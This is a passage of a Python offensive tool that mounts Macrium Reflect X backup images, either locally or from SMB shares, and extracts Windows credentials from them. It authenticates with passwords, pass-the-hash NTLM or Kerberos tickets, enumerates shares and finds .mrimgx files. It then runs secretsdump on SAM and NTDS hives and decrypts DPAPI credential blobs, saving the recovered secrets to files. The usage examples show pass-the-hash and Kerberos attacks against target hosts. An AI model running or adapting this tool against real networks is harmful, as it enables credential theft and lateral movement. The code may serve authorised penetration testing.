    machinekey = _extract_dpapi_machinekey(secretsdump_outfile)
    if not machinekey:
        tprint("  [*] DPAPI_SYSTEM key not in secretsdump output — skipping credential blobs")
        return

    dp = _find_dpapi()
    if not dp:
        tprint("[!] dpapi.py not found — skipping credential blobs (pip install -U impacket)")
        return

    masterkeys = _decrypt_system_masterkeys(mnt, machinekey, dp)
    if not masterkeys:
        tprint("  [*] No SYSTEM DPAPI masterkeys decrypted")
        return

    blobs = _find_credential_blobs(mnt)
    if not blobs:
        tprint("  [*] No DPAPI credential blobs found")
        return

    outfile = f"{hostname}_creds.txt"
    results = []
    for blob in blobs:
        for mk in masterkeys:  # stop at first masterkey that decrypts — blobs use one key each
            try:
                result = subprocess.run([dp, "credential", "-file", blob, "-key", mk],
                                        capture_output=True, text=True, timeout=30)
                out = result.stdout.strip()
                if out:
                    results.append(f"[{Path(blob).name}]\n{out}")
                    break
            except Exception:
                pass

    if results:
        content = "\n\n".join(results)
        tprint(content)
        with open(outfile, "w") as f:
            f.write(content)
        tprint(f"[+] Credential blobs saved: {outfile}")
    else:
        tprint("  [*] No credential blobs decrypted")


def _dump_from_mount(mnt: str, hostname: str):
    """Find credential hives on an already-mounted NTFS volume and run secretsdump."""
    hives = find_hive_paths(mnt)
    if hives["ntds"] and hives["system"]:
        print("[+] Domain Controller backup detected")
        dump_dc(hostname, hives["ntds"], hives["system"], hives.get("security"))
    elif hives["sam"] and hives["system"]:
        print("[+] SAM database found")
        dump_sam(hostname, hives["sam"], hives["system"], hives.get("security"))
    else:
        print(f"  [!] No credential hives found in {mnt}")

    dump_task_creds(hostname, mnt, f"{hostname}_secretsdump.txt")



# ---------------------------------------------------------------------------
# Per-file processing
# ---------------------------------------------------------------------------

def process_mrimgx_file(file_path: str, password: str = "",
                         prior_full_layout: dict = None):
    """Parse a single .mrimgx file and extract credentials from all NTFS partitions."""
    hostname = Path(file_path).stem
    print(f"\n[*] Processing: {Path(file_path).name}")

    try:
        layout = parse_mrimgx(file_path, password=password,
                               prior_full_layout=prior_full_layout)
    except RuntimeError as e:
        print(f"[!] Parse error: {e}")
        return

    is_delta = layout["_header"].get("delta_index", False)
    backup_type = layout["_header"].get("backup_type", "full")
    print(f"[*] Backup type: {backup_type}  delta_index: {is_delta}")
    print(f"[*] Disks: {len(layout.get('disks', []))}")

    for disk_idx, disk in enumerate(layout.get("disks", [])):
        disk_fmt = disk.get("_header", {}).get("disk_format", "unknown")
        partitions = disk.get("partitions", [])
        print(f"\n[*] Disk {disk_idx}: {disk_fmt}, {len(partitions)} partition(s)")

        for part_idx, partition in enumerate(partitions):
            fs_info = partition.get("_file_system", {})
            fs_type = fs_info.get("type", "unknown")
            geom    = partition.get("_geometry", {})
            length  = geom.get("length", 0)
            label   = fs_info.get("volume_label", "")

            print(f"\n  [*] Partition {part_idx}: {fs_type}"
                  f"{' (' + label + ')' if label else ''}"
                  f"  {length / (1024**3):.2f} GB")

            if fs_type not in ("NTFS", "unknown"):
                print(f"  [*] Skipping non-NTFS partition ({fs_type})")
                continue

            nbd, nbd_dev, mnt = mount_nbd_partition(layout, disk, partition)
            if nbd is None:
                continue
            try:
                _dump_from_mount(mnt, f"{hostname}_disk{disk_idx}_part{part_idx}")
            finally:
                unmount_nbd_partition(nbd, nbd_dev, mnt)


# ---------------------------------------------------------------------------
# Directory scanning
# ---------------------------------------------------------------------------

def scan_for_mrimgx(directory: str) -> list:
    """Recursively scan a single directory for .mrimgx files."""
    found = []
    stack = [directory]
    while stack:
        current = stack.pop()
        try:
            with os.scandir(current) as it:
                for entry in it:
                    try:
                        if entry.is_dir(follow_symlinks=False):
                            stack.append(entry.path)
                        elif entry.is_file(follow_symlinks=False):
                            if entry.name.lower().endswith(".mrimgx"):
                                found.append(entry.path)
                                tprint(f"    [+] FOUND: {entry.name} ({get_file_size_gb(entry.path)})")
                    except (PermissionError, OSError):
                        continue
        except (PermissionError, OSError) as e:
            tprint(f"  [!] Cannot read {current}: {e}")
    return found


def find_mrimgx_files(paths: list, max_workers: int = 10) -> list:
    """
    Scan one or more root paths for .mrimgx files using a thread pool.
    Each top-level subdirectory is dispatched as a parallel task.
    """
    from concurrent.futures import ThreadPoolExecutor, as_completed

    print(f"[*] Scanning for .mrimgx files...")
    early_hits: list = []
    tasks: list = []

    for root in paths:
        p = Path(root)
        if not p.exists():
            print(f"[!] Path does not exist, skipping: {root}")
            continue
        try:
            with os.scandir(p) as it:
                for entry in it:
                    if entry.is_dir(follow_symlinks=False):
                        tasks.append(entry.path)
                    elif entry.is_file(follow_symlinks=False):
                        if entry.name.lower().endswith(".mrimgx"):
                            early_hits.append(entry.path)
                            tprint(f"    [+] FOUND: {entry.name} ({get_file_size_gb(entry.path)})")
        except (PermissionError, OSError) as e:
            tprint(f"  [!] Cannot read {root}: {e}")

    results = list(early_hits)
    if tasks:
        tprint(f"[*] Dispatching {len(tasks)} subdir task(s) across {min(max_workers, len(tasks))} thread(s)...")
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = {ex.submit(scan_for_mrimgx, d): d for d in tasks}
            for future in as_completed(futures):
                try:
                    results.extend(future.result())
                except Exception as e:
                    tprint(f"[!] Scan thread error: {e}")

    tprint(f"[*] Scan complete — {len(results)} .mrimgx file(s) found")
    return results


def select_files(files: list) -> list:
    if not files:
        return []
    print("\n[*] .mrimgx files found:")
    for i, f in enumerate(files, 1):
        size = get_file_size_gb(f)
        print(f"  [{i}] {Path(f).name} ({size})")
    print("  [a] All")
    print("  [n] None")

    while True:
        choice = input("\n[?] Select files (1,2,3 or 'a'/'n'): ").strip().lower()
        if choice in ("n", "none"):
            return []
        if choice in ("a", "all"):
            return files
        try:
            indices = [int(x.strip()) for x in choice.split(",")]
            selected = [files[i - 1] for i in indices if 1 <= i <= len(files)]
            if selected:
                return selected
        except (ValueError, IndexError):
            pass
        print("[!] Invalid selection")


# ---------------------------------------------------------------------------
# SMB share helpers
# ---------------------------------------------------------------------------

def _smb_decode(val) -> str:
    if isinstance(val, bytes):
        for enc in ("utf-16le", "utf-8", "latin1"):
            try:
                return val.decode(enc).strip("\x00").strip()
            except Exception:
                continue
        return ""
    return str(val).strip("\x00").strip()


def parse_hashes(hashes_str: str):
    """Parse LMHASH:NTHASH or :NTHASH into (lmhash, nthash)."""
    lmhash = nthash = ''
    if hashes_str:
        parts = hashes_str.split(':', 1)
        lmhash = parts[0]
        nthash = parts[1] if len(parts) > 1 else ''
    return lmhash, nthash


# ---------------------------------------------------------------------------
# Impacket FUSE filesystem — same approach as vhdvomit.py:
# mount.cifs MD4-hashes whatever password you give it, so NTLM hashes and
# Kerberos tickets cannot work through it.  This FUSE layer uses impacket
# directly so hash/Kerberos auth works and no files need to be downloaded.
# ---------------------------------------------------------------------------

class _ImpacketFUSE:
    """Read-only FUSE backend (fusepy API) backed by two impacket SMBConnections."""

    def __init__(self, host: str, share: str, user: str, password: str,
                 domain: str, lmhash: str, nthash: str, kerberos: bool,
                 aes_key: str, kdc_host: str):
        self.share = share
        self._list_lock = threading.Lock()
        self._io_lock   = threading.Lock()
        self._fh_map: dict = {}
        self._next_fh   = 1

        args = (host, user, password, domain, lmhash, nthash, kerberos, aes_key, kdc_host)
        self._list_conn = self._connect(*args)
        self._io_conn   = self._connect(*args)
        self._tid = self._io_conn.connectTree(share)

    @staticmethod
    def _connect(host, user, password, domain, lmhash, nthash,
                 kerberos, aes_key, kdc_host):
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(host, host, sess_port=445)
        if kerberos:
            conn.kerberosLogin(user, password, domain, lmhash, nthash,
                               aes_key, kdcHost=kdc_host or host)
        else:
            conn.login(user, password, domain, lmhash, nthash)
        return conn

    def _smb_path(self, fuse_path: str) -> str:
        p = fuse_path.replace('/', '\\')
        return p or '\\'

    def getattr(self, path: str, fh=None):
        import errno
        import stat as _stat
        from fuse import FuseOSError

        if path == '/':
            return {'st_mode': _stat.S_IFDIR | 0o755, 'st_nlink': 2,
                    'st_uid': 0, 'st_gid': 0, 'st_size': 0,
                    'st_atime': 0, 'st_mtime': 0, 'st_ctime': 0}

        parent, name = path.rsplit('/', 1)
        smb_parent = self._smb_path(parent or '/')
        search = smb_parent.rstrip('\\') + '\\' + name

        with self._list_lock:
            try:
                for e in self._list_conn.listPath(self.share, search):
                    ename = e.get_longname()
                    if ename in ('.', '..'):
                        continue
                    if ename.lower() == name.lower():
                        if e.is_directory():
                            return {'st_mode': _stat.S_IFDIR | 0o755, 'st_nlink': 2,
                                    'st_uid': 0, 'st_gid': 0, 'st_size': 0,
                                    'st_atime': 0, 'st_mtime': 0, 'st_ctime': 0}
                        return {'st_mode': _stat.S_IFREG | 0o444, 'st_nlink': 1,
                                'st_uid': 0, 'st_gid': 0, 'st_size': e.get_filesize(),
                                'st_atime': 0, 'st_mtime': 0, 'st_ctime': 0}
            except Exception:
                pass
        raise FuseOSError(errno.ENOENT)

    def readdir(self, path: str, fh):
        smb_path = self._smb_path(path)
        search = smb_path.rstrip('\\') + '\\*'
        names = ['.', '..']
        with self._list_lock:
            try:
                for e in self._list_conn.listPath(self.share, search):
                    name = e.get_longname()
                    if name not in ('.', '..'):
                        names.append(name)
            except Exception as ex:
                tprint(f"  [!] readdir {path}: {ex}")
        return names

    def open(self, path: str, flags):
        import errno
        from fuse import FuseOSError
        smb_path = self._smb_path(path)
        with self._io_lock:
            try:
                fid = self._io_conn.openFile(
                    self._tid, smb_path,
                    desiredAccess=0x80000000,
                    shareMode=0x00000007,
                )
                fh = self._next_fh
                self._next_fh += 1
                self._fh_map[fh] = fid
                return fh
            except Exception as ex:
                tprint(f"  [!] open {path}: {ex}")
                raise FuseOSError(errno.EIO)

    def read(self, path: str, size: int, offset: int, fh):
        import errno
        from fuse import FuseOSError
        fid = self._fh_map.get(fh)
        if fid is None:
            raise FuseOSError(errno.EBADF)
        with self._io_lock:
            try:
                data = self._io_conn.readFile(self._tid, fid,
                                              offset=offset,
                                              bytesToRead=size,
                                              singleCall=False)
                return data or b''
            except Exception as ex:
                tprint(f"  [!] read {path}@{offset}: {ex}")
                raise FuseOSError(errno.EIO)

    def release(self, path: str, fh):
        with self._io_lock:
            fid = self._fh_map.pop(fh, None)
            if fid is not None:
                try:
                    self._io_conn.closeFile(self._tid, fid)
                except Exception:
                    pass
        return 0

    def write(self, path: str, data: bytes, offset: int, fh) -> int:
        # Silently discard all writes — allows qemu to replay a dirty VHDX log
        # in its own memory without touching the original file on the share.
        return len(data)

    def flush(self, path: str, fh) -> int:
        return 0

    def fsync(self, path: str, datasync, fh) -> int:
        return 0

    def teardown(self):
        for conn in (self._list_conn, self._io_conn):
            try:
                conn.logoff()
            except Exception:
                pass


def mount_impacket_fuse(host: str, share: str, user: str, password: str,
                        domain: str, lmhash: str, nthash: str,
                        kerberos: bool, aes_key: str,
                        kdc_host: str) -> tuple:
    """Mount an SMB share via impacket as a read-only FUSE filesystem."""
    try:
        from fuse import FUSE, Operations, FuseOSError
    except ImportError:
        die("fusepy not found — install: pip install fusepy  OR  apt install python3-fuse")

    mnt = f"/mnt/smb_{share}"
    Path(mnt).mkdir(parents=True, exist_ok=True)
    if _is_mounted(mnt):
        subprocess.run(["umount", "-l", mnt], capture_output=True)

    backend = _ImpacketFUSE(host, share, user, password, domain,
                             lmhash, nthash, kerberos, aes_key, kdc_host)

    class _FW(Operations):
        def getattr(self, path, fh=None):             return backend.getattr(path, fh)
        def readdir(self, path, fh):                  return backend.readdir(path, fh)
        def open(self, path, flags):                  return backend.open(path, flags)
        def read(self, path, size, offset, fh):       return backend.read(path, size, offset, fh)
        def release(self, path, fh):                  return backend.release(path, fh)
        def write(self, path, data, offset, fh):      return backend.write(path, data, offset, fh)
        def flush(self, path, fh):                    return backend.flush(path, fh)
        def fsync(self, path, datasync, fh):          return backend.fsync(path, datasync, fh)

    def _run():
        FUSE(_FW(), mnt, nothreads=True, foreground=True)

    t = threading.Thread(target=_run, daemon=True)
    t.start()

    for _ in range(20):
        if _is_mounted(mnt):
            print(f"[+] Impacket FUSE mounted {share} at {mnt}")
            return mnt, backend
        time.sleep(0.5)

    die(f"Impacket FUSE mount timed out for //{host}/{share}")


def list_smb_shares(host: str, user: str, password: str, domain: str,
                    lmhash: str = '', nthash: str = '',
                    kerberos: bool = False, aes_key: str = '',
                    kdc_host: str = '') -> list:
    """Return [(name, remark), ...] for non-admin shares on host."""
    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        die("impacket not installed — run: pip install impacket")
    try:
        conn = SMBConnection(host, host, sess_port=445)
        if kerberos:
            conn.kerberosLogin(user, password, domain, lmhash, nthash,
                               aes_key, kdcHost=kdc_host or host)
        else:
            conn.login(user, password, domain, lmhash, nthash)
        result = []
        for share in conn.listShares():
            try:
                name = _smb_decode(share["shi1_netname"])
            except Exception:
                name = _smb_decode(share.get("shi1_netname", ""))
            if not name or name.upper() in ("IPC$", "ADMIN$"):
                continue
            remark = ""
            try:
                remark = _smb_decode(share.get("shi1_remark", ""))
            except Exception:
                pass
            result.append((name, remark))
        conn.logoff()
        return result
    except Exception as e:
        die(f"SMB connection failed: {e}")


def select_shares(shares: list) -> list:
    print("\n[*] Available shares:")
    for i, (name, remark) in enumerate(shares, 1):
        desc = f" — {remark}" if remark else ""
        print(f"  [{i}] {name}{desc}")
    print("  [a] All shares")
    while True:
        choice = input("\n[?] Select shares (1,2,3 or 'a'): ").strip().lower()
        if choice in ("a", "all"):
            return [s[0] for s in shares]
        try:
            indices = [int(x.strip()) for x in choice.split(",")]
            selected = [shares[i - 1][0] for i in indices if 1 <= i <= len(shares)]
            if selected:
                return selected
        except (ValueError, IndexError):
            pass
        print("[!] Invalid selection")


def _cifs_creds_file(domain: str, user: str, password: str) -> str:
    """Write CIFS credentials to a 0600 temp file and return its path."""
    fd, path = tempfile.mkstemp(prefix="cifs_", suffix=".creds")
    os.close(fd)
    with open(path, "w") as f:
        if domain:
            f.write(f"domain={domain}\n")
        if user:
            f.write(f"username={user}\n")
        if password:
            f.write(f"password={password}\n")
    os.chmod(path, 0o600)
    return path


def _is_mounted(path: str) -> bool:
    try:
        with open("/proc/mounts") as f:
            return any(line.split()[1] == path for line in f)
    except Exception:
        return False


def _mount_cifs(host: str, share: str, creds_file: str) -> Optional[str]:
    mnt = str(Path("/mnt") / share)
    Path(mnt).mkdir(parents=True, exist_ok=True)

    if _is_mounted(mnt):
        choice = input(f"[?] {mnt} already mounted. [r]euse/[u]nmount/[s]kip? ").strip().lower()
        if choice == "r":
            return mnt
        elif choice == "u":
            subprocess.run(["umount", mnt], capture_output=True)
            subprocess.run(["umount", "-l", mnt], capture_output=True)
        else:
            return None

    r = subprocess.run(
        ["mount", "-t", "cifs", f"//{host}/{share}", mnt,
         "-o", f"credentials={creds_file},vers=3.0,iocharset=utf8"],
        capture_output=True
    )
    if r.returncode != 0:
        print(f"[!] Failed to mount {share}: {r.stderr.decode(errors='replace').strip()}")
        return None
    print(f"[+] Mounted {share} at {mnt}")
    return mnt


# ---------------------------------------------------------------------------
# Main modes
# ---------------------------------------------------------------------------

def run_smb_mode(args):
    host     = args.target
    user     = args.username or ""
    password = args.password or ""
    domain   = args.domain or ""
    kerberos = args.kerberos
    aes_key  = args.aesKey or ""
    kdc_host = args.dc_ip or ""

    lmhash, nthash = parse_hashes(args.hashes)

    use_fuse = kerberos or bool(nthash)
    if not use_fuse and user and not password and not getattr(args, 'no_pass', False):
        password = getpass.getpass("[?] SMB password: ")

    domain_prefix = f"{domain}\\" if domain else ""
    if kerberos:
        auth_str = f"Kerberos as {domain_prefix}{user}"
    elif nthash:
        auth_str = f"NTLM hash as {domain_prefix}{user}"
    elif user:
        auth_str = f"{domain_prefix}{user}"
    else:
        auth_str = "(null auth)"
    print(f"[*] Connecting to {host} as {auth_str}...")

    shares = list_smb_shares(host, user, password, domain,
                              lmhash=lmhash, nthash=nthash,
                              kerberos=kerberos, aes_key=aes_key, kdc_host=kdc_host)
    if not shares:
        die("No accessible shares found")

    specific_path = (args.path or "").replace("\\", "/")
    if specific_path:
        raw_share = specific_path.split("/")[0].rstrip("$")
        subpath   = specific_path[len(raw_share):].lstrip("/$")
        available = [s[0] for s in shares]
        share_name = next(
            (n for n in (raw_share + "$", raw_share) if n in available), None
        )
        if not share_name:
            die(f"Share '{raw_share}' not found — available: {', '.join(available)}")
        selected_shares = [share_name]
        print(f"[*] Using share: {share_name}" + (f"/{subpath}" if subpath else ""))
    else:
        selected_shares = select_shares(shares)
        subpath = ""

    if not selected_shares:
        die("No shares selected")

    if use_fuse:
        print("[*] Using impacket FUSE (hash/Kerberos auth — bypasses mount.cifs)")
    creds_file = None if use_fuse else _cifs_creds_file(domain, user, password)

    mounted: list = []       # [(share_name, mnt_path)]
    fuse_mounts: list = []   # [(mnt, backend)]

    try:
        for share in selected_shares:
            if use_fuse:
                mnt, backend = mount_impacket_fuse(
                    host, share, user, password, domain,
                    lmhash, nthash, kerberos, aes_key, kdc_host)
                mounted.append((share, mnt))
                fuse_mounts.append((mnt, backend))
            else:
                mnt = _mount_cifs(host, share, creds_file)
                if mnt:
                    mounted.append((share, mnt))

        if not mounted:
            die("No shares mounted successfully")

        scan_paths = [
            str(Path(mnt) / subpath) if subpath else mnt
            for _, mnt in mounted
        ]

        all_files = find_mrimgx_files(scan_paths, max_workers=args.workers)
        if not all_files:
            print("[!] No .mrimgx files found")
            return

        selected_files = select_files(all_files)
        backup_pw = args.backup_password or ""
        for f in selected_files:
            process_mrimgx_file(f, password=backup_pw)

        print("\n[+] Complete")

    finally:
        print("[*] Cleaning up shares...")
        fuse_mnt_set = {m for m, _ in fuse_mounts}

        for mnt, backend in fuse_mounts:
            subprocess.run(["fusermount", "-u", mnt], capture_output=True)
            time.sleep(0.3)
            if _is_mounted(mnt):
                subprocess.run(["umount", "-l", mnt], capture_output=True)
            backend.teardown()
            print(f"[+] Unmounted {mnt}")

        for share, mnt in mounted:
            if mnt not in fuse_mnt_set and _is_mounted(mnt):
                subprocess.run(["umount", mnt], capture_output=True)
                subprocess.run(["umount", "-l", mnt], capture_output=True)
                print(f"[+] Unmounted {mnt}")

        if creds_file:
            try:
                os.remove(creds_file)
            except Exception:
                pass


def run_scan_mode(args):
    directory = args.scan_dir
    if not Path(directory).is_dir():
        die(f"Not a directory: {directory}")

    print(f"[*] Scanning {directory} for .mrimgx files...")
    files = scan_for_mrimgx(directory)
    if not files:
        print("[!] No .mrimgx files found")
        return

    selected = select_files(files)
    for f in selected:
        process_mrimgx_file(f, password=args.backup_password or "")

    print("\n[+] Complete")


def run_file_mode(args):
    file_path = args.file
    if not Path(file_path).exists():
        die(f"File not found: {file_path}")
    if not file_path.lower().endswith(".mrimgx"):
        print(f"[!] Warning: file does not have .mrimgx extension")

    process_mrimgx_file(file_path, password=args.backup_password or "")
    print("\n[+] Complete")


def main():
    ensure_root()

    print(BANNER)

    parser = argparse.ArgumentParser(
        description="Mount Macrium Reflect X (.mrimgx) backup images and extract credentials",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  SMB — null auth, enumerate shares:
    %(prog)s -t 192.168.1.10

  SMB — password auth:
    %(prog)s -t 192.168.1.10 -u administrator -p Password123 -d CORP

  SMB — pass-the-hash (NTLM):
    %(prog)s -t 192.168.1.10 -u administrator -d CORP -hashes :a87f3a337d73085c45f9416be5787d86

  SMB — Kerberos (uses KRB5CCNAME ticket cache):
    %(prog)s -t dc01.corp.local -u administrator -d CORP -k

  SMB — specific share path:
    %(prog)s -t 192.168.1.10 -u admin -p pass --path "Backups$/Macrium"

  SMB — encrypted backups:
    %(prog)s -t 192.168.1.10 -u admin -p pass -B BackupPass1

  Local — single file:
    %(prog)s /mnt/backups/workstation.mrimgx

  Local — scan directory:
    %(prog)s --scan-dir /mnt/backups

  Local — encrypted backup:
    %(prog)s /mnt/backups/workstation.mrimgx -B BackupPass1
""")

    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument("file", nargs="?", metavar="FILE",
                      help=".mrimgx file to process")
    mode.add_argument("--scan-dir", metavar="DIR",
                      help="Local directory to scan for .mrimgx files")
    mode.add_argument("-t", "--target", metavar="HOST",
                      help="Target host IP or hostname (SMB mode)")

    # SMB credentials
    smb = parser.add_argument_group("SMB options (used with -t)")
    smb.add_argument("-u", "--username", default="",
                     help="SMB username (default: null auth)")
    smb.add_argument("-p", "--password", default="",
                     help="SMB password")
    smb.add_argument("-d", "--domain", default="",
                     help="SMB domain")
    smb.add_argument("-hashes", metavar="LMHASH:NTHASH", default="",
                     help="NTLM hashes for authentication, format: LMHASH:NTHASH or :NTHASH")
    smb.add_argument("-no-pass", action="store_true", dest="no_pass",
                     help="Skip password prompt (use with -k or -hashes)")
    smb.add_argument("-k", "--kerberos", action="store_true",
                     help="Use Kerberos authentication (reads TGT from KRB5CCNAME)")
    smb.add_argument("-aesKey", metavar="hex key", default="",
                     help="AES key for Kerberos authentication (128 or 256 bits)")
    smb.add_argument("-dc-ip", metavar="ip address", default="", dest="dc_ip",
                     help="IP address of the domain controller (Kerberos KDC)")
    smb.add_argument("--path", default="",
                     help='Specific share path, e.g. "Backups$/Macrium"')
    smb.add_argument("--workers", type=int, default=10,
                     help="Parallel scan threads (default: 10)")

    # Backup encryption
    parser.add_argument("-B", "--backup-password", default="",
                        metavar="PASSWORD",
                        help="mrimgx backup encryption password")

    args = parser.parse_args()

    check_deps(smb_mode=bool(args.target))

    if args.target:
        run_smb_mode(args)
    elif args.scan_dir:
        run_scan_mode(args)
    else:
        run_file_mode(args)


if __name__ == "__main__":
    main()
